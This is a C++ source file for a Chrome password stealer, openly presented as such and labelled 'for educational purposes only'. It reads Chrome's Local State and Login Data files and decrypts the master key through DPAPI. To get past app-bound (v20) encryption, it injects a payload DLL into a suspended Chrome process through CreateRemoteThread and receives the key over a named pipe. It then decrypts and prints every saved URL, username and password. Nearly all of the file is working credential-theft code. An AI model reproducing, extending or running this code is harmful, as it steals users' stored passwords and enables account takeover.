#include "ChromeStealer.h"


//Check if WIndows system
#ifdef _WIN32


// Checks if Google Chrome is installed on the machine.
// This function queries the Windows Registry to check if the registry key
// for Chrome's installation path exists.
// @return True if Chrome is installed, false otherwise.
bool IsChromeInstalled() {
  HKEY hKey;
  // Open the registry key for Chrome's installation path.
  LONG lRes = RegOpenKeyEx(HKEY_LOCAL_MACHINE,
    L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe",
    0, KEY_READ, &hKey);

  // If the key exists, Chrome is installed.
  if (lRes == ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return true;
  }
  else {
    return false;
  }
}

// Finds the path to the Local State file.
// This function retrieves the user's profile path and constructs the path to
// the Local State file used by Google Chrome.
// @return The path to the Local State file as a wide string.
std::wstring FindLocalState() {
  WCHAR userProfile[MAX_PATH];
  HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

  if (!SUCCEEDED(result)) {
    warn("Error getting user path. Error: %ld", GetLastError());
    return L"";
  }

  WCHAR localStatePath[MAX_PATH];
  _snwprintf_s(localStatePath, MAX_PATH, _TRUNCATE, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", userProfile);
  okay("Full path to Local State file: %ls", localStatePath);
  return std::wstring(localStatePath);
}

// Finds the path to the Login Data file.
// This function retrieves the user's profile path and constructs the path to
// the Login Data file used by Google Chrome.
// @return The path to the Login Data file as a wide string.
std::wstring FindLoginData() {
  WCHAR userProfile[MAX_PATH];
  //CSIDL_PROFILE macro for USER PROFILE
  HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

  if (!SUCCEEDED(result)) {
    warn("Error getting user path. Error: %ld", GetLastError());
    return L"";
  }

  WCHAR loginDataPath[MAX_PATH];
  _snwprintf_s(loginDataPath, MAX_PATH, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", userProfile);
  okay("Full path to Login Data file: %ls", loginDataPath);
  return std::wstring(loginDataPath);
}

// Retrieves the encrypted key from the Local State file.
// This function reads the Local State file in JSON format and extracts the
// encrypted key used by Google Chrome.
// @param localStatePath The path to the Local State file.
// @return The encrypted key as a string.
std::string getEncryptedKey(const std::wstring& localStatePath) {
  std::ifstream file(localStatePath);
  if (!file.is_open()) {
    warn("Error opening the file. Error: %ld", GetLastError());
    return "";
  }
  json localState = json::parse(file);
  file.close();

  auto itOsEncrypt = localState.find("os_crypt");
  if (itOsEncrypt == localState.end() || !itOsEncrypt.value().is_object()) {
    warn("Key os_crypt not found or not an object.");
    return "";
  }
  okay("Key os_crypt found.");

  auto itEncryptedKey = itOsEncrypt.value().find("encrypted_key");
  if (itEncryptedKey == itOsEncrypt.value().end()) {
    warn("Key encrypted_key not found or not an object");
    return "";
  }

  okay("Key encrypted_key found");
  std::string encryptedKey = itEncryptedKey.value();
  //okay("Value at key encrypted_key: %s", encryptedKey.c_str());

  return encryptedKey;
}

// Retrieves app_bound_encrypted_key from Local State (APPB prefix - Chrome ABE).
std::string getAppBoundEncryptedKey(const std::wstring& localStatePath) {
  std::ifstream file(localStatePath);
  if (!file.is_open()) return "";
  json localState = json::parse(file);
  file.close();

  auto itOsCrypt = localState.find("os_crypt");
  if (itOsCrypt == localState.end() || !itOsCrypt.value().is_object()) return "";

  auto it = itOsCrypt.value().find("app_bound_encrypted_key");
  if (it == itOsCrypt.value().end() || !it.value().is_string()) return "";

  std::string key = it.value().get<std::string>();
  if (key.size() < 4 || key.substr(0, 4) != "APPB") return "";
  return key;
}

// Gets chrome.exe path from registry.
std::wstring GetChromePath() {
  HKEY hKey = NULL;
  WCHAR path[MAX_PATH] = { 0 };
  DWORD pathLen = sizeof(path);

  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe",
      0, KEY_READ, &hKey) != ERROR_SUCCESS)
    return L"";

  if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)path, &pathLen) != ERROR_SUCCESS) {
    RegCloseKey(hKey);
    return L"";
  }
  RegCloseKey(hKey);
  return std::wstring(path);
}

// Decrypts app-bound key via Chrome process injection (IElevator::DecryptData).
bool DecryptKeyViaChromeInjection(const std::wstring& localStatePath, DATA_BLOB& outKey) {
  outKey.pbData = NULL;
  outKey.cbData = 0;

  std::wstring chromePath = GetChromePath();
  if (chromePath.empty()) {
    warn("Chrome path not found.");
    return false;
  }

  WCHAR exePath[MAX_PATH];
  if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) return false;
  std::wstring exeDir = exePath;
  size_t lastSlash = exeDir.find_last_of(L"\\/");
  if (lastSlash == std::wstring::npos) return false;
  exeDir = exeDir.substr(0, lastSlash + 1);
  std::wstring dllPath = exeDir + L"ChromeStealerPayload.dll";

  if (GetFileAttributesW(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
    warn("ChromeStealerPayload.dll not found next to exe. ABE decryption requires it.");
    return false;
  }

  WCHAR pipeNameBuf[MAX_PATH];
  wsprintfW(pipeNameBuf, L"\\\\.\\pipe\\ChromeStealerKey_%u", GetTickCount());
  std::wstring pipeName = pipeNameBuf;

  WCHAR configPath[MAX_PATH];
  if (GetTempPathW(MAX_PATH, configPath) == 0) return false;
  wcscat_s(configPath, L"cs_abe_pipe.txt");
  HANDLE hConfig = CreateFileW(configPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hConfig == INVALID_HANDLE_VALUE) return false;
  std::string pipeNameA;
  for (wchar_t w : pipeName) pipeNameA.push_back((char)(w & 0xff));
  WriteFile(hConfig, pipeNameA.c_str(), (DWORD)pipeNameA.size(), NULL, NULL);
  CloseHandle(hConfig);

  HANDLE hPipe = CreateNamedPipeW(pipeName.c_str(),
      PIPE_ACCESS_INBOUND, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
      1, 64, 64, 30000, NULL);
  if (hPipe == INVALID_HANDLE_VALUE) {
    DeleteFileW(configPath);
    return false;
  }

  STARTUPINFOW si = { sizeof(si) };
  PROCESS_INFORMATION pi = { 0 };
  if (!CreateProcessW(chromePath.c_str(), NULL, NULL, NULL, FALSE,
      CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
    CloseHandle(hPipe);
    DeleteFileW(configPath);
    return false;
  }

  size_t dllPathLen = (dllPath.size() + 1) * sizeof(wchar_t);
  void* remotePath = VirtualAllocEx(pi.hProcess, NULL, dllPathLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!remotePath) {
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    CloseHandle(hPipe);
    DeleteFileW(configPath);
    return false;
  }
  if (!WriteProcessMemory(pi.hProcess, remotePath, dllPath.c_str(), dllPathLen, NULL)) {
    VirtualFreeEx(pi.hProcess, remotePath, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    CloseHandle(hPipe);
    DeleteFileW(configPath);
    return false;
  }

  HMODULE hKernel = GetModuleHandleW(L"kernel32.dll");
  FARPROC pLoadLibrary = GetProcAddress(hKernel, "LoadLibraryW");
  HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0,
      (LPTHREAD_START_ROUTINE)pLoadLibrary, remotePath, 0, NULL);
  if (!hThread) {
    VirtualFreeEx(pi.hProcess, remotePath, 0, MEM_RELEASE);
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    CloseHandle(hPipe);
    DeleteFileW(configPath);
    return false;
  }

  WaitForSingleObject(hThread, 15000);
  CloseHandle(hThread);
  VirtualFreeEx(pi.hProcess, remotePath, 0, MEM_RELEASE);
  TerminateProcess(pi.hProcess, 0);
  CloseHandle(pi.hProcess);
  CloseHandle(pi.hThread);
  DeleteFileW(configPath);

  if (!ConnectNamedPipe(hPipe, NULL) && GetLastError() != ERROR_PIPE_CONNECTED) {
    CloseHandle(hPipe);
    return false;
  }

  BYTE keyBuf[32] = { 0 };
  DWORD read = 0;
  BOOL ok = ReadFile(hPipe, keyBuf, 32, &read, NULL);
  CloseHandle(hPipe);
  if (!ok || read < 32) return false;

  outKey.cbData = 32;
  outKey.pbData = (BYTE*)LocalAlloc(LMEM_FIXED, 32);
  if (!outKey.pbData) return false;
  memcpy(outKey.pbData, keyBuf, 32);
  okay("App-bound key obtained via Chrome injection (ABE bypass).");
  return true;
}

// Decrypts an encrypted key using the CryptUnprotectData function.
// This function decodes a Base64-encoded string and decrypts it to retrieve
// the original key.
// @param encrypted_key The encrypted key as a Base64-encoded string.
// @return The decrypted key as a DATA_BLOB structure.
DATA_BLOB decryptKey(const std::string& encrypted_key) {
  if (encrypted_key.empty()) {
    warn("Input string is empty.");
    return {};
  }

  DWORD decodedBinarySize = 0;
  if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decodedBinarySize, NULL, NULL)) {
    warn("Error decoding Base64 string first step. Error: %ld\n", GetLastError());
    return {};
  }

  if (decodedBinarySize == 0) {
    warn("Decoded binary size is zero.");
    return {};
  }

  std::vector<BYTE> decodedBinaryData(decodedBinarySize);
  if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, decodedBinaryData.data(), &decodedBinarySize, NULL, NULL)) {
    warn("Error decoding Base64 string second step. Error: %ld\n", GetLastError());
    return {};
  }

  if (decodedBinaryData.size() < 5) {
    warn("Decoded binary data size is too small.\n");
    return {};
  }
  decodedBinaryData.erase(decodedBinaryData.begin(), decodedBinaryData.begin() + 5);

  DATA_BLOB DataInput;
  DATA_BLOB DataOutput;

  DataInput.cbData = static_cast<DWORD>(decodedBinaryData.size());
  DataInput.pbData = decodedBinaryData.data();

  if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
    warn("Error decrypting data. Error %ld", GetLastError());
    LocalFree(DataOutput.pbData);
    return {};
  }
  //info("The decrypted data is: %s", DataOutput.pbData);

  return DataOutput;
}

// Parses the Login Data file to extract and decrypt login credentials.
// This function opens the Login Data SQLite database, executes a query to retrieve login
// credentials, and decrypts the passwords using the provided decryption key.
// @param loginDataPath The path to the Login Data file.
// @param decryptionKey The key used to decrypt the login data.
// @return An integer indicating success (0) or failure (non-zero).
int loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) {
  sqlite3* loginDataBase = nullptr;
  int openingStatus = 0;

  std::wstring copyLoginDataPath = loginDataPath;
  copyLoginDataPath.append(L"a");

  if (!CopyFileW(loginDataPath.c_str(), copyLoginDataPath.c_str(), FALSE)) {
    warn("Error copying the file. Error: %ld", GetLastError());
    return EXIT_FAILURE;
  }

  using convert_type = std::codecvt_utf8<wchar_t>;
  std::wstring_convert<convert_type, wchar_t> converter;
  std::string string_converted_path = converter.to_bytes(copyLoginDataPath);

  openingStatus = sqlite3_open_v2(string_converted_path.c_str(), &loginDataBase, SQLITE_OPEN_READONLY, nullptr);

  if (openingStatus) {
    warn("Can't open database: %s", sqlite3_errmsg(loginDataBase));
    sqlite3_close(loginDataBase);

    if (!DeleteFileW(copyLoginDataPath.c_str())) {
      warn("Error deleting the file. Error: %ld", GetLastError());
      return EXIT_FAILURE;
    }

    return openingStatus;
  }

  const char* sql = "SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins";
  sqlite3_stmt* stmt = nullptr;
  openingStatus = sqlite3_prepare_v2(loginDataBase, sql, -1, &stmt, nullptr);

  if (openingStatus != SQLITE_OK) {
    warn("SQL error: %s", sqlite3_errmsg(loginDataBase));
    sqlite3_close(loginDataBase);

    if (!DeleteFileW(copyLoginDataPath.c_str())) {
      warn("Error deleting the file. Error: %ld", GetLastError());
      return EXIT_FAILURE;
    }

    return openingStatus;
  }

  okay("Executed SQL Query.");

  while ((openingStatus = sqlite3_step(stmt)) == SQLITE_ROW) {
    const unsigned char* originUrl = sqlite3_column_text(stmt, 0);
    const unsigned char* usernameValue = sqlite3_column_text(stmt, 1);
    const void* passwordBlob = sqlite3_column_blob(stmt, 2);
    int passwordSize = sqlite3_column_bytes(stmt, 2);
    int blacklistedByUser = sqlite3_column_int(stmt, 3);

    if (originUrl != NULL && originUrl[0] != '\0' &&
      usernameValue != NULL && usernameValue[0] != '\0' &&
      passwordBlob != NULL && blacklistedByUser != 1) {

      // Check minimum size: 3 bytes prefix + 12 bytes IV + at least 16 bytes (ciphertext + auth tag)
      if (passwordSize < (IV_SIZE + 3 + 16)) {
        warn("Password size too small: %d bytes", passwordSize);
        continue;
      }

      // Check prefix - Chrome uses "v10", "v11", or "v20" for AES-256-GCM
      const unsigned char* blob = (const unsigned char*)passwordBlob;
      if (blob[0] != 'v') {
        warn("Unknown password encryption prefix: %c%c%c", blob[0], blob[1], blob[2]);
        continue;
      }
      
      // Check version: v10, v11, or v20 (ABE key obtained via Chrome injection when app_bound_encrypted_key present)
      bool validVersion = false;
      if (blob[1] == '1' && (blob[2] == '0' || blob[2] == '1')) {
        validVersion = true;
      }
      else if (blob[1] == '2' && blob[2] == '0') {
        validVersion = true;
      }
      
      if (!validVersion) {
        warn("Unknown password encryption version: v%c%c", blob[1], blob[2]);
        continue;
      }

      // Extract IV (nonce) - 12 bytes after the 3-byte prefix
      unsigned char iv[IV_SIZE];
      memcpy(iv, blob + 3, IV_SIZE);

      // Extract ciphertext (everything after prefix + IV)
      int ciphertextLen = passwordSize - (IV_SIZE + 3);
      BYTE* ciphertext = (BYTE*)malloc(ciphertextLen);
      if (ciphertext == NULL) {
        warn("Memory allocation failed");
        continue;
      }
      memcpy(ciphertext, blob + (IV_SIZE + 3), ciphertextLen);

      // Decrypt password
      unsigned char decrypted[1024] = { 0 };
      size_t decryptedLen = 0;
      
      bool decryptSuccess = decryptPassword(ciphertext, ciphertextLen, decryptionKey.pbData, decryptionKey.cbData, iv, decrypted, &decryptedLen);

      if (decryptSuccess && decryptedLen > 0) {
        decrypted[decryptedLen] = '\0';
        okay("Origin URL: %s", originUrl);
        okay("Username Value: %s", usernameValue);
        okay("Password: %s", decrypted);
      }
      else {
        warn("Failed to decrypt password for URL: %s", originUrl);
      }

      free(ciphertext);
      info("----------------------------------");
    }
  }

  if (openingStatus != SQLITE_DONE) {
    warn("SQL error or end of data: %s", sqlite3_errmsg(loginDataBase));
  }

  sqlite3_finalize(stmt);
  sqlite3_close(loginDataBase);

  if (!DeleteFileW(copyLoginDataPath.c_str())) {
    warn("Error deleting the file. Error: %ld", GetLastError());
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}

// Decrypts a password using the provided key and initialization vector (IV).
// This function uses the libsodium library to decrypt the ciphertext.
// @param ciphertext The encrypted password.
// @param ciphertext_len The length of the encrypted password.
// @param key The key used for decryption.
// @param key_len The length of the key (should be 32 bytes for AES-256).
// @param iv The initialization vector used for decryption (12 bytes).
// @param decrypted The buffer to store the decrypted password.
// @param decrypted_len Output parameter for the length of decrypted data.
// @return True if decryption succeeded, false otherwise.
bool decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, size_t key_len, unsigned char* iv, unsigned char* decrypted, size_t* decrypted_len) {
  // AES-256-GCM requires a 32-byte key
  if (key_len < 32) {
    fprintf(stderr, "Invalid key length: %zu bytes (need at least 32 bytes)\n", key_len);
    return false;
  }
  
  // Use only first 32 bytes of the key
  unsigned char key_32[32];
  memcpy(key_32, key, 32);

  // IV must be 12 bytes for AES-GCM
  if (IV_SIZE != 12) {
    fprintf(stderr, "Invalid IV size: %d bytes (expected 12 bytes)\n", IV_SIZE);
    return false;
  }

  // For AES-GCM, auth tag is the last 16 bytes
  if (ciphertext_len < 16) {
    fprintf(stderr, "Ciphertext too short: %zu bytes (need at least 16 bytes for auth tag)\n", ciphertext_len);
    return false;
  }

  // Separate ciphertext and auth tag
  size_t data_len = ciphertext_len - 16;
  unsigned char* data = ciphertext;
  unsigned char* auth_tag = ciphertext + data_len;

  BCRYPT_ALG_HANDLE hAlg = NULL;
  BCRYPT_KEY_HANDLE hKey = NULL;
  NTSTATUS status = 0;
  bool success = false;
  ULONG decrypted_len_ul = 0;

  // Open AES-GCM algorithm provider
  status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
  if (status != 0) {
    fprintf(stderr, "BCryptOpenAlgorithmProvider failed: 0x%x\n", status);
    goto cleanup;
  }

  // Set chaining mode to GCM
  status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
  if (status != 0) {
    fprintf(stderr, "BCryptSetProperty failed: 0x%x\n", status);
    goto cleanup;
  }

  // Generate symmetric key
  status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key_32, 32, 0);
  if (status != 0) {
    fprintf(stderr, "BCryptGenerateSymmetricKey failed: 0x%x\n", status);
    goto cleanup;
  }

  // Prepare authentication info for GCM
  BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
  BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
  authInfo.pbNonce = iv;
  authInfo.cbNonce = IV_SIZE;
  authInfo.pbTag = auth_tag;
  authInfo.cbTag = 16;
  authInfo.pbAuthData = NULL;
  authInfo.cbAuthData = 0;

  // Decrypt data
  status = BCryptDecrypt(hKey, data, (ULONG)data_len, &authInfo, NULL, 0, decrypted, (ULONG)data_len, &decrypted_len_ul, 0);
  if (status != 0) {
    // 0xc000a002 = STATUS_AUTH_TAG_MISMATCH - common with v20 application-bound encryption
    if (status == 0xc000a002) {
      fprintf(stderr, "BCryptDecrypt failed: Authentication tag mismatch (0x%x) - v20 may use application-bound encryption\n", status);
    }
    else {
      fprintf(stderr, "BCryptDecrypt failed: 0x%x\n", status);
    }
    goto cleanup;
  }

  *decrypted_len = decrypted_len_ul;
  success = true;

cleanup:
  if (hKey) BCryptDestroyKey(hKey);
  if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);

  return success;
}

void displayMenu() {
  printf("Menu:\n");
  printf("1. Proceed with decryption\n");
  printf("2. Quit\n");
  printf("Enter your choice: ");
}

int main() {
#ifdef _WIN32

  printf(YELLOW  // Set text color to purple
    "________________________________________________________________________________________\n"
    "_________ .__                                    _________ __                .__        \n"
    "\\_   ___ \\|  |_________  ____   _____   ____    /   _____//  |_  ____ _____  |  |   ___________\n"
    "/    \\  \\/|  |  \\_  __ \\/  _ \\ /     \\_/ __ \\   \\_____  \\\\   __\\/ __ \\\\__  \\ |  | _/ __ \\_  __ \\\n"
    "\\     \\___|   Y  \\  | \\(  <_> )  Y Y  \\  ___/   /        \\|  | \\  ___/ / __ \\|  |_\\  ___/|  | \\/\n"
    " \\______  /___|  /__|   \\____/|__|_|  /\\___  > /_______  /|__|  \\___  >____  /____/\\___  >__|   \n"
    "        \\/     \\/                   \\/     \\/          \\/           \\/     \\/          \\/        \n"
    "________________________________________________________________________________________\n"
    RESET  // Reset text color
    "\n"
    "                                Made by Bernking\n"
    "                           For educational purposes only\n"
    "                        Check my GitHub: https://github.com/BernKing\n"
    "                            Check my blog: https://bernking.github.io/\n"
  );

  printf("\n\n");

  int choice = 0;
  displayMenu();
  scanf_s("%d", &choice);

  switch (choice) {
  case 1:
    if (IsChromeInstalled()) {

      okay("Google Chrome is installed.");
      std::wstring localStatePath = FindLocalState();
      std::wstring loginDataPath = FindLoginData();

      DATA_BLOB decryptionKey = { 0 };
      std::string appBoundKey = getAppBoundEncryptedKey(localStatePath);

      if (!appBoundKey.empty()) {
        info("App-bound encryption (v20) detected. Using Chrome injection to obtain key...");
        if (DecryptKeyViaChromeInjection(localStatePath, decryptionKey)) {
          int parser = loginDataParser(loginDataPath, decryptionKey);
          (void)parser;
          LocalFree(decryptionKey.pbData);
        }
        else {
          warn("ABE decryption failed. Ensure ChromeStealerPayload.dll is next to the exe.");
        }
      }
      else {
        std::string encryptedKey = getEncryptedKey(localStatePath);
        decryptionKey = decryptKey(encryptedKey);
        if (decryptionKey.pbData && decryptionKey.cbData > 0) {
          int parser = loginDataParser(loginDataPath, decryptionKey);
          (void)parser;
          LocalFree(decryptionKey.pbData);
        }
        else {
          warn("Could not obtain decryption key.");
        }
      }
    }
    else {
      warn("Google Chrome is not installed. Shutting down.");
    }
    break;
  case 2:
    okay("Exiting the program.");
    break;
  default:
    warn("Invalid choice. Exiting the program.");
    break;
  }

  return EXIT_SUCCESS;

#else
  warn("This program only runs on Windows systems.\n");
  return EXIT_FAILURE;
#endif
}

#endif // _WIN32